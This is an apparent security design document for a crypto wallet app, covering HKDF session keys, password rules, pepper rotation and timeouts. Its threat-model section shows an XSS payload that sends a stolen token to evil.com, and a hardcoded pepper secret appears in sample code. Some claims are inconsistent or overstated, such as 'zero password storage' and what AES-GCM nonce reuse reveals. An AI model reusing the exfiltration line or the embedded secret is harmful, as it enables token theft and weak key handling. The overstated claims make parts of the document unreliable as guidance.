# ArcSign v2 - Security Architecture

**Last Updated**: 2026-01-12
**Version**: 2.0 (Zero Password Storage + HKDF)

## Table of Contents
- [Overview](#overview)
- [Session Token Architecture](#session-token-architecture)
- [Key Derivation (HKDF)](#key-derivation-hkdf)
- [Password Handling Rules](#password-handling-rules)
- [Pepper Rotation Strategy](#pepper-rotation-strategy)
- [Session Timeout Policy](#session-timeout-policy)
- [Attack Resistance](#attack-resistance)

---

## Overview

ArcSign v2 implements a **zero password storage architecture** with defense-in-depth security:

### Core Security Principles

1. **Zero Password Storage** (Frontend)
   - Frontend NEVER stores passwords (even in memory after auth)
   - Passwords only exist in function scope during input
   - Immediately cleared after use

2. **Defense-in-Depth Encryption** (Backend)
   - Session tokens use HKDF with server pepper
   - Token leak alone CANNOT decrypt sensitive data
   - Requires both token AND server pepper (never leaves backend)

3. **Risk-Based Authentication**
   - **Low-risk operations** (queries): Use session tokens
   - **High-risk operations** (signing): Require explicit password input

---

## Session Token Architecture

### Token Generation

```go
// Token generation uses crypto/rand (CSPRNG)
func generateSecureToken() (string, error) {
    bytes := make([]byte, 32) // 256 bits
    if _, err := rand.Read(bytes); err != nil {
        return "", err
    }
    return hex.EncodeToString(bytes), nil
}
```

**Security Properties**:
- ✅ Uses `crypto/rand` (cryptographically secure PRNG)
- ✅ 32 bytes (256 bits) → 64 hex characters
- ✅ Collision probability: negligible (2^-256)

### Token Storage

**Backend** (Go):
```go
type Session struct {
    Token                string
    ExpiresAt            time.Time
    LastUsed             time.Time
    EncryptedProviderKey []byte  // HKDF-encrypted
    PepperVersion        int     // For key rotation
}
```

**Frontend** (TypeScript):
```typescript
// Zustand store (memory-only)
const useSessionStore = create<SessionState>((set, get) => ({
  token: string | null,  // ✅ Memory only, cleared on app close
  expiresAt: number | null,
  // ...
}));
```

**Why NOT use HttpOnly cookies or localStorage?**
- ❌ HttpOnly cookies: Not applicable in Tauri (desktop app, not web browser)
- ❌ localStorage: XSS risk, persists across sessions
- ✅ Memory-only (Zustand): Best for Tauri desktop apps

---

## Key Derivation (HKDF)

### HKDF Parameters

```go
// Formula: aesKey = HKDF-SHA256(IKM=SHA256(token), salt=pepper[version], info="session-key-v{version}")
func deriveKeyFromToken(token string, pepperVersion int) ([]byte, error) {
    // IKM: Input Keying Material (SHA-256 of token)
    tokenHash := sha256.Sum256([]byte(token))

    // Salt: Versioned server pepper (≥32 bytes random)
    pepper, err := getPepper(pepperVersion)

    // Info: Context string with version binding
    info := fmt.Sprintf("session-key-v%d", pepperVersion)

    // HKDF-Extract-and-Expand
    hkdfReader := hkdf.New(sha256.New, tokenHash[:], []byte(pepper), []byte(info))

    // Output: 32 bytes for AES-256-GCM
    key := make([]byte, 32)
    io.ReadFull(hkdfReader, key)

    return key, nil
}
```

### Security Analysis

| Component | Purpose | Security Benefit |
|-----------|---------|------------------|
| **IKM** (Input Key Material) | `SHA256(token)` | Normalizes token to 32 bytes |
| **Salt** (Server Pepper) | Versioned random ≥32 bytes | Prevents offline decryption attacks |
| **Info** (Context) | `"session-key-v{version}"` | Domain separation + version binding |
| **Output** | 32 bytes | AES-256-GCM key |

**Why this is secure**:
1. **Token leak alone is useless**: Attacker needs server pepper to derive key
2. **Server pepper never leaves backend**: Cannot be stolen via XSS
3. **Version binding**: Cross-version attacks prevented by info string
4. **HKDF standard**: RFC 5869, widely reviewed and adopted

### AES-GCM Encryption

```go
func encryptProviderKey(appPassword string, token string, pepperVersion int) ([]byte, error) {
    // Derive key using HKDF
    key, _ := deriveKeyFromToken(token, pepperVersion)
    defer zeroBytes(key)

    // Create AES-256-GCM cipher
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)

    // Generate UNIQUE random nonce (12 bytes)
    // CRITICAL: MUST be unique for each encryption with same key
    nonce := make([]byte, gcm.NonceSize()) // 12 bytes
    rand.Read(nonce)  // crypto/rand (CSPRNG)

    // Encrypt: output = nonce || ciphertext || auth_tag
    plaintext := []byte(appPassword)
    ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

    return ciphertext, nil
}
```

**Nonce Uniqueness Guarantee**:
- ✅ Generated with `crypto/rand` (CSPRNG)
- ✅ 12 bytes = 96 bits
- ✅ Collision probability: negligible (2^-96)
- ✅ Prepended to ciphertext for decryption

**Why AES-GCM nonce reuse is catastrophic**:
```
Same (key, nonce) reused:
→ XOR ciphertext1 with ciphertext2
→ Reveals XOR of plaintext1 and plaintext2
→ Can recover both plaintexts + key
→ TOTAL COMPROMISE
```

---

## Password Handling Rules

### Rule 1: High-Risk Operations (Transaction Signing)

**Require explicit password input every time**:

```typescript
// ❌ WRONG: Using stored password or session token for signing
const signTransaction = async () => {
  const sessionToken = getSessionToken();
  await tauriApi.signTransaction({
    txData,
    sessionToken  // ❌ Session token CANNOT be used for signing
  });
};

// ✅ CORRECT: Prompt user for password
const signTransaction = async () => {
  const password = await promptPassword();  // User input

  try {
    await tauriApi.signTransaction({
      txData,
      password  // ✅ Fresh password input
    });
  } finally {
    // Clear password immediately after use
    zeroString(password);
  }
};
```

**Why this matters**:
- Signing = moving funds = highest risk
- Session hijack should NOT allow signing
- User awareness: explicit action for sensitive operations

### Rule 2: Low-Risk Operations (Queries, Build Transaction)

**Use session tokens**:

```typescript
// ✅ CORRECT: Session token for balance queries
const getBalances = async () => {
  const sessionToken = getSessionToken();

  if (!sessionToken) {
    // Session expired, redirect to login
    return;
  }

  const balances = await tauriApi.getTokenBalances({
    walletId,
    password: walletPassword,  // Only for wallet decryption
    usbPath,
    sessionToken,  // ✅ Session token for provider config access
  });
};
```

### Rule 3: Password Lifetime in Frontend

```typescript
// ❌ WRONG: Storing password in state or ref
const [password, setPassword] = useState("");  // ❌ Persists in memory
const passwordRef = useRef("");  // ❌ Persists until unmount

// ✅ CORRECT: Password only in function scope
const handleSign = async () => {
  const tempPassword = inputRef.current.value;  // Read once

  try {
    await signTransaction({ password: tempPassword });
  } finally {
    tempPassword = "";  // Clear immediately
    inputRef.current.value = "";  // Clear input field
  }
};
```

### Rule 4: Backend Password Handling

```go
// ❌ WRONG: Storing password in session
type Session struct {
    AppPassword string  // ❌ NEVER do this
}

// ✅ CORRECT: Only encrypted provider key in session
type Session struct {
    EncryptedProviderKey []byte  // ✅ HKDF-encrypted, needs token+pepper
}

// ✅ CORRECT: Password only in function parameter
func SignTransaction(walletID, password string, txData []byte) ([]byte, error) {
    defer zeroString(&password)  // Clear after use

    // Use password to decrypt wallet
    privateKey, _ := decryptWallet(walletID, password)
    defer zeroBytes(privateKey)

    // Sign transaction
    signature, _ := sign(privateKey, txData)

    return signature, nil
}
```

---

## Pepper Rotation Strategy

### Current Architecture

```go
const (
    CurrentPepperVersion = 1
)

var serverPeppers = map[int]string{
    // Version 1: Current (2026-01-12)
    1: "KzJ8mR9qL3vN5wXpY2tC6fH4bV7sA1dE8nM0gT3xU9yZ4rI6oP5jQ2kW8hB7lF3v",

    // Version 0: Deprecated (grace period: 7 days)
    0: "arcsign-v2-session-encryption-pepper-2026-change-in-production",
}

type Session struct {
    EncryptedProviderKey []byte
    PepperVersion        int  // ✅ Stores which pepper was used
}
```

### Rotation Process

**Step 1: Add new pepper version**
```go
var serverPeppers = map[int]string{
    2: "NEW_SECURE_RANDOM_PEPPER_32_BYTES_OR_MORE",  // New
    1: "KzJ8mR9qL3vN5wXpY2tC6fH4bV7sA1dE...",      // Current → Old
    0: "arcsign-v2-session-encryption...",           // Old → Remove after grace period
}

const CurrentPepperVersion = 2  // Update to new version
```

**Step 2: New sessions use v2, old sessions still use v1**
```go
func (sm *SessionManager) CreateSession(...) (*Session, error) {
    pepperVersion, _ := getCurrentPepper()  // Returns 2
    // New sessions encrypted with pepper v2
}

func (sm *SessionManager) GetProviderKey(token string) (string, error) {
    session, _ := sm.ValidateToken(token)
    // Decrypt using session.PepperVersion (might be 0, 1, or 2)
    providerKey, _ := decryptProviderKey(..., session.PepperVersion)
}
```

**Step 3: After grace period (7 days), remove old pepper**
```go
var serverPeppers = map[int]string{
    2: "NEW_SECURE_RANDOM_PEPPER...",  // Current
    1: "KzJ8mR9qL3vN5wXpY2tC6fH4...",  // Keep for grace period
    // 0: removed - old sessions will fail to decrypt (users re-login)
}
```

### Grace Period Guidelines

| User Activity | During Grace Period | After Grace Period |
|---------------|---------------------|-------------------|
| Active users | Sessions auto-renewed with v2 | N/A |
| Inactive users (< 7 days) | Old sessions (v1) still work | Must re-login |
| Very inactive users (> 7 days) | Already expired (24h max) | Must re-login |

---

## Session Timeout Policy

### Dual Timeout System

```go
const (
    // Absolute timeout: 24 hours from creation
    SessionMaxLifetime = 24 * time.Hour

    // Idle timeout: 2 hours of inactivity
    SessionIdleTimeout = 2 * time.Hour
)
```

### Validation Logic

```go
func (sm *SessionManager) ValidateToken(token string) (*Session, error) {
    now := time.Now()

    // Check 1: Absolute expiration
    if now.After(session.ExpiresAt) {
        return nil, ErrSessionExpired
    }

    // Check 2: Idle timeout
    idleTime := now.Sub(session.LastUsed)
    if idleTime > SessionIdleTimeout {
        return nil, ErrSessionIdle  // 2 hours of inactivity
    }

    // Update LastUsed (touch session)
    session.LastUsed = now

    return session, nil
}
```

### Timeout Scenarios

| Scenario | Timeout Type | Duration | Behavior |
|----------|--------------|----------|----------|
| Continuous active use | Absolute | 24 hours | Force re-login |
| Abandoned session | Idle | 2 hours | Auto-revoke |
| Sleep/close app | Idle | 2 hours | Must re-login on wake |
| Normal usage pattern | Idle (reset) | Reset on activity | Session stays alive |

**Why 2 hours idle timeout?**
- ✅ Balance: Security vs UX
- ✅ Desktop app: User might leave app open but inactive
- ✅ Security: Prevents session hijack on shared computers
- ✅ Common practice: Banks use 15-30min, we use 2h (desktop app is lower risk)

---

## Attack Resistance

### Attack 1: XSS → Session Token Theft

**Attack**:
```javascript
// Attacker injects XSS payload
<script>
  const token = localStorage.getItem('sessionToken');
  fetch('https://evil.com/steal?token=' + token);
</script>
```

**Defense**:
```typescript
// ❌ Vulnerable: localStorage
localStorage.setItem('sessionToken', token);  // ❌ XSS can read

// ✅ Resistant: Memory-only (Zustand)
const useSessionStore = create((set) => ({
  token: null,  // ✅ Not in localStorage
}));

// Even if XSS steals token:
// 1. Attacker still needs server pepper to decrypt provider key
// 2. Cannot sign transactions (requires password)
// 3. Can only query data (low-risk operations)
```

**Result**: Token leak → Limited damage (query-only access)

### Attack 2: Token Leak → Offline Decryption

**Attack**:
```
Attacker obtains:
1. Session token
2. Encrypted provider key (from memory dump / network sniff)

Attacker attempts offline brute-force:
- Try to decrypt provider key with token alone
```

**Defense**:
```go
// Without server pepper, attacker CANNOT derive key
key = HKDF(SHA256(token), serverPepper, info)
                          ^^^^^^^^^^^^^^^
                          Never leaves backend!

// Attacker's attack fails:
// - Cannot decrypt EncryptedProviderKey
// - Cannot access provider API keys
// - Cannot query balances or build transactions
```

**Result**: Token + EncryptedProviderKey leak → No sensitive data exposed

### Attack 3: Session Hijack → Unauthorized Signing

**Attack**:
```
Attacker hijacks session token:
1. Steals token via XSS or network sniff
2. Attempts to sign transaction with hijacked session
```

**Defense**:
```go
// High-risk operations REQUIRE password
func SignTransaction(walletID, password string, txData []byte) ([]byte, error) {
    // ✅ Password required (not session token)
    // Attacker doesn't have password

    privateKey, err := decryptWallet(walletID, password)
    if err != nil {
        return nil, errors.New("invalid password")
    }

    // Sign transaction
    signature := sign(privateKey, txData)
    return signature, nil
}
```

**Result**: Session hijack → Cannot sign transactions (password protected)

### Attack 4: Replay Attack

**Attack**:
```
Attacker captures valid API request:
POST /api/signTransaction
{
  "walletId": "xxx",
  "txData": "...",
  "sessionToken": "hijacked_token"
}

Attacker replays request multiple times
```

**Defense**:
```go
// Defense 1: Transaction nonce (blockchain-level)
type Transaction struct {
    Nonce uint64  // ✅ Prevents replay on blockchain
}

// Defense 2: Session token expires
func (sm *SessionManager) ValidateToken(token string) (*Session, error) {
    // ✅ Token expires after 2h idle / 24h absolute
    if expired {
        return nil, ErrSessionExpired
    }
}

// Defense 3: Signing requires password (not token)
// Even if replayed, backend rejects without password
```

**Result**: Replay attack → Blocked by nonce + expiration + password requirement

### Attack 5: Pepper Leak → Mass Compromise

**Attack**:
```
Attacker gains access to server:
1. Reads server pepper from environment variables
2. Collects all session tokens + EncryptedProviderKeys
3. Attempts mass decryption
```

**Defense**:
```go
// Defense 1: Pepper rotation
// Even if leaked, rotate pepper → old sessions invalidated

// Defense 2: Limited impact
// - Can decrypt provider API keys (can query data)
// - CANNOT sign transactions (still need wallet passwords)
// - CANNOT steal funds (wallet keys are separate)

// Defense 3: Detection & response
// - Monitor for suspicious API usage patterns
// - Invalidate all sessions (force re-login)
// - Rotate pepper immediately
```

**Result**: Pepper leak → Serious but contained (cannot steal funds)

---

## Production Deployment Checklist

### Before Production

- [ ] **Replace serverPepper with secure random 32+ bytes**
  ```bash
  # Generate secure pepper
  openssl rand -base64 32
  # Store in environment variable or KMS
  ```

- [ ] **Load pepper from environment variables**
  ```go
  func init() {
      pepper := os.Getenv("ARCSIGN_SESSION_PEPPER_V1")
      if pepper == "" {
          log.Fatal("ARCSIGN_SESSION_PEPPER_V1 not set")
      }
      serverPeppers[1] = pepper
  }
  ```

- [ ] **Set up pepper rotation schedule**
  - Quarterly rotation (every 3 months)
  - Keep old pepper for 7-day grace period
  - Document rotation procedure

- [ ] **Configure session timeouts for production**
  ```go
  // Adjust based on product requirements
  const (
      SessionMaxLifetime = 24 * time.Hour  // Or 8h for stricter security
      SessionIdleTimeout = 2 * time.Hour   // Or 30min for banking-level
  )
  ```

- [ ] **Set up monitoring**
  - Failed login attempts
  - Session creation/revocation rates
  - Idle timeout triggers
  - Pepper rotation events

- [ ] **Audit logging**
  - Log all authentication events
  - Log high-risk operations (signing)
  - Do NOT log passwords or full tokens

---

## Summary

### Security Guarantees

| Threat | Protection | Result |
|--------|------------|--------|
| Password storage | Zero password storage | No passwords in memory |
| Token theft (XSS) | HKDF + Server Pepper | Token alone is useless |
| Session hijack | Password-protected signing | Cannot sign transactions |
| Offline decryption | Server pepper secret | Cannot decrypt without pepper |
| Session abandonment | Idle timeout (2h) | Auto-revoke inactive sessions |
| Long-lived sessions | Absolute timeout (24h) | Force re-authentication |
| Pepper compromise | Versioned rotation | Limited blast radius |

### Architecture Summary

```
┌─────────────────────────────────────────────────────────────┐
│                     ArcSign Security Architecture            │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  Frontend (Tauri)                 Backend (Go)                │
│  ┌──────────────┐                ┌──────────────┐            │
│  │ User Input   │ Password       │ Validate     │            │
│  │ (temporary)  │───────────────>│ Credentials  │            │
│  └──────────────┘                └───────┬──────┘            │
│         │                                 │                   │
│         │ ✅ Cleared after use            │ ✅ Generate       │
│         │                                 │    secure token   │
│         ▼                                 ▼                   │
│  ┌──────────────┐                ┌──────────────┐            │
│  │ Session      │ Session Token  │ HKDF + Pepper│            │
│  │ Token Store  │<───────────────│ Encryption   │            │
│  │ (Memory)     │                └──────────────┘            │
│  └──────┬───────┘                        │                   │
│         │                                 │ ✅ Store          │
│         │ ✅ Token for queries            │    encrypted key  │
│         │                                 ▼                   │
│  ┌──────▼───────┐                ┌──────────────┐            │
│  │ Low-Risk Ops │ Session Token  │ Session      │            │
│  │ (Queries)    │───────────────>│ Store        │            │
│  └──────────────┘                └──────────────┘            │
│         │                                 │                   │
│  ┌──────▼───────┐                        │ ✅ Decrypt with   │
│  │ High-Risk    │ Password (prompt)      │    token+pepper   │
│  │ (Signing)    │───────────────────────>│                   │
│  └──────────────┘                        ▼                   │
│                                   ┌──────────────┐            │
│                                   │ Provider Key │            │
│                                   │ (Decrypted)  │            │
│                                   └──────────────┘            │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

**Defense-in-Depth Layers**:
1. **Layer 1**: Zero password storage (frontend)
2. **Layer 2**: HKDF with server pepper (backend)
3. **Layer 3**: Password-protected signing (high-risk ops)
4. **Layer 4**: Session timeouts (idle + absolute)
5. **Layer 5**: Pepper versioning (key rotation)

**Result**: Even if multiple layers are breached, sensitive operations remain protected.

---

**Document Version**: 2.0
**Last Reviewed**: 2026-01-12
**Next Review**: 2026-04-12 (Quarterly)
